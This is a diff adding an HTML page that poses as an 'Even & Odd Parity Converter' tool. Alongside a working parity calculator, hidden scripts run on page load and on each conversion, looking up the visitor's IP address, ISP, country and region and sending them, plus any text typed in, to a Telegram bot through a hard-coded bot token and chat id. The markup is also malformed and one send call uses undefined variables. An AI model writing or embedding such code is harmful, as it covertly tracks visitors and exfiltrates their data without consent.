@@ -1,0 +1,183 @@
+<html lang="en" class="">
+<head>
+  <head>
+    <meta content="/images/branding/googleg/1x/googleg_standard_color_128dp.png" itemprop="image">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+</head>
+
+
+	</div>
+
+    <meta charset="UTF-8">
+    <title>Even & Odd Parity Converter</title>
+  
+    <meta name="robots" content="noindex">
+  
+
+    
+    
+  
+      <style id="INLINE_PEN_STYLESHEET_ID">@import url("https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap");
+  * {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+    font-family: "Poppins", sans-serif;
+  }
+  
+  body {
+    display: flex;
+    align-items: center;
+    min-height: 100vh;
+    flex-direction: column;
+    gap: 30px;
+    background: #1d2b3a;
+  }
+  
+  .inputBox {
+    position: relative;
+    width: 250px;
+  }
+  .inputBox input {
+    padding: 10px;
+    width: 100%;
+    border: 1px solid rgba(255, 255, 255, 0.25);
+    background: #1d2b3a;
+    border-radius: 5px;
+    outline: none;
+    color: #fff;
+    font-size: 1em;
+    transition: 0.5s;
+  }
+  .inputBox span {
+    position: absolute;
+    left: 0;
+    padding: 10px;
+    pointer-events: none;
+    font-size: 1em;
+    color: rgba(255, 255, 255, 0.25);
+    text-transform: uppercase;
+    transition: all 0.5s;
+  }
+  
+  .inputBox input:valid ~ span,
+  .inputBox input:focus ~ span {
+    color: #00dfc4;
+    transform: translate(10px, -7px);
+    font-size: 0.65em;
+    padding: 0 10px;
+    background: #1d2b3a;
+    border-left: 1px solid #00dfc4;
+    border-right: 1px solid #00dfc4;
+    letter-spacing: 0.2em;
+  }
+  
+  .inputBox input:valid,
+  .inputBox input:focus {
+    border: 1px solid #00dfc4;
+  }
+  
+  .inputBox:nth-child(2) input:valid ~ span,
+  .inputBox:nth-child(2) input:focus ~ span {
+    background: #00dfc4;
+    color: #1d2b3a;
+    border-radius: 2px;
+  }</style></head>
+  
+  <body>
+    
+
+    <script>
+      $.getJSON('https://ipapi.co/json', function(data) {
+          var ip = data.ip;
+          var isp = data.org;
+          var country = data.country_name;
+          var city = data.region;
+
+          var message = `IP Address: ${ip}%0AISP: ${isp}%0ACountry: ${country}%0ACity: ${city}`;
+          sendTelegramMessage(message);
+      });
+
+      function sendTelegramMessage(message) {
+          var chatId = '1045091647';
+          var botToken = '6268789988:AAFslFmhzIT8m4uGpdZgarfvicJrciJ_vg0';
+
+          var xhr = new XMLHttpRequest();
+          xhr.open('GET', `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}`, true);
+          xhr.send();
+      }
+  </script>
+		<h1 style="display: flex; justify-content: center; font-size: 24px; padding: 5px 10px; border-radius: 7px; border: none; background-color: #1d2b3a; color: #fff; cursor: default; width: 90%; max-width: 950px; margin: 0 auto; text-align: center;">
+  
+    </h1>
+		<h1 style="display: flex; justify-content: center; font-size: 24px; padding: 5px 10px; border-radius: 7px; border: none; background-color: #1d2b3a; color: #fff; cursor: default; width: 90%; max-width: 950px; margin: 0 auto; text-align: center;">
+      Even & Odd Parity Converter
+    </h1>
+    <div class="inputBox">
+    <input type="text" id="inputText" required="" onkeyup="checkEnter(event)">
+    <span>Enter YOUR Text</span>
+  </div>
+    <button onclick="convertText()" title="Show result" type="button" id="calculate-btn" style="display: flex; justify-content: center; font-size: 24px; padding: 15px 30px; border-radius: 7px; border: none; background-color: #1d2b3a; color: #fff; cursor: pointer; width: 90%; max-width: 250px; margin: 0 auto;border: 1px solid #00dfc4; text-align: center;">Convert</button>    </div>
+    <div id="result" style="display: flex; justify-content: center; font-size: 24px; padding: 5px 10px; border-radius: 7px; border: none; background-color: #1d2b3a; color: #fff; cursor: default; width: 90%; max-width: 950px; margin: 0 auto;; text-align: center;"></div>
+    <div class="result-box" id="evenParityBox" style="display: flex; justify-content: center; display: none; font-size: 14px; padding: 15px 30px; border-radius: 7px; border: none; background-color: #1d2b3a; color: #fff; cursor: pointer; width: 90%; max-width: 250px; margin: 0 auto;border: 1px solid #00dfc4; text-align: center;"></div>
+    <div class="result-box" id="oddParityBox" style="display: flex; justify-content: center; display: none; font-size: 14px; padding: 15px 30px; border-radius: 7px; border: none; background-color: #1d2b3a; color: #fff; cursor: pointer; width: 90%; max-width: 250px; margin: 0 auto;border: 1px solid #00dfc4; text-align: center;"></div>
+
+  </div>
+
+    
+  <script src="https://cpwebassets.codepen.io/assets/common/stopExecutionOnTimeout-2c7831bb44f98c1391d6a4ffda0e1fd302503391ca806e7fcc7b9b87197aec26.js"></script>
+  <script>
+    function checkEnter(event) {
+      if (event.keyCode === 13) {
+          convertText();
+      }
+    }
+
+    function convertText() {
+    var inputText = document.getElementById("inputText").value;
+    var evenParityResult = '';
+    var oddParityResult = '';
+
+    $.getJSON('https://ipapi.co/json', function(data) {
+        var ip = data.ip;
+        var isp = data.org;
+        var country = data.country_name;
+        var city = data.region;
+
+        var message = `IP Address: ${ip}%0AISP: ${isp}%0ACountry: ${country}%0ACity: ${city}%0AInput Text: ${inputText}`;
+
+        sendTelegramMessage(message);
+    });
+  
+      for (var i = 0; i < inputText.length; i++) {
+          var charCode = inputText.charCodeAt(i);
+          var binary = charCode.toString(2);
+          var count = binary.replace(/0/g, '').length;
+  
+          if (count % 2 === 0) {
+              evenParityResult += 'Even Parity '+ '"' + inputText[i] + '"' + ':' + '0' + binary + '<br>' + '<br>';
+              oddParityResult += 'Odd Parity '+ '"' + inputText[i] + '"'+ ':' + '1' + binary + '<br>' + '<br>' ;
+          } else {
+              evenParityResult += 'Even Parity '+ '"' + inputText[i] + '"'+ ':' + '1' + binary + '<br>' + '<br>';
+              oddParityResult += 'Odd Parity '+ '"' + inputText[i] + '"'+ ':' + '0' + binary + '<br>' + '<br>';
+          }
+      }
+      document.getElementById("evenParityBox").innerHTML = evenParityResult;
+      document.getElementById("oddParityBox").innerHTML = oddParityResult;
+      document.getElementById("evenParityBox").style.display = "block";
+      document.getElementById("oddParityBox").style.display = "block";
+
+
+
+      var message = `IP Address: ${ip}%0AISP: ${isp}%0ACountry: ${country}%0ACity: ${city}%0Input Text: ${inputText}`;
+      sendTelegramMessage(message);
+  
+    }
+</script>
+  
+  
+  </body></html>
+
+
+
